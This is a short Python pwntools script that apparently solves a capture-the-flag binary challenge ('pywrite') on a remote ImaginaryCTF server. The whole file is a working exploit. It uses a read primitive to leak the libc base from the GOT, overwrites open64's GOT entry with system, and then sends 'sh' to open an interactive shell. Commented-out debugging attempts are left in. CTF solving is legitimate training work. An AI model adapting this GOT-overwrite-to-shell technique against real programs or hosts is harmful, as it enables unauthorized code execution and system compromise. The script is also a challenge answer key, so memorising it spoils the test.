from pwn import *

elf = ELF("./python3")
libc = ELF("./libc.so.6")

#conn = process(["ltrace", "-o", "ltrace.out", "./python3", "vuln.py"])
#conn = process(["./ld-2.31.so", "./python3", "vuln.py"], env={"LD_PRELOAD": "./libc.so.6"})
conn = remote("pywrite.chal.imaginaryctf.org", 1337)

def read(where):
  conn.recvuntil(">")
  conn.sendline("1")
  conn.recvuntil("?")
  conn.sendline(str(where))
  return int(conn.recvline())

def write(what, where):
  conn.recvuntil(">")
  conn.sendline("2")
  conn.recvuntil("?")
  conn.sendline(str(what))
  conn.recvuntil("?")
  conn.sendline(str(where))

# leak libc by reading GOT
libc.address = read(elf.got.write) - libc.sym.write
info("libc @ " + hex(libc.address))
print(hex(libc.address+0xe6c84))

#gdb.attach(conn)
# some sort of math operation goes on when int() errors, calling round(0x909b40)
#write(u64(b";&1;sh\0\0"), 0x909b40) # write sh\x00 there, with some semicolons because LSB gets overwritten sometimes
#write(u64(b";&1;sh\0\0"), libc.address-0x75acd0) # write sh\x00 there, with some semicolons because LSB gets overwritten sometimes
write(libc.sym.system, elf.got.open64) # overwrite GOT
conn.sendline("3")
conn.sendline("sh")
#conn.recvuntil("> ")
conn.interactive()
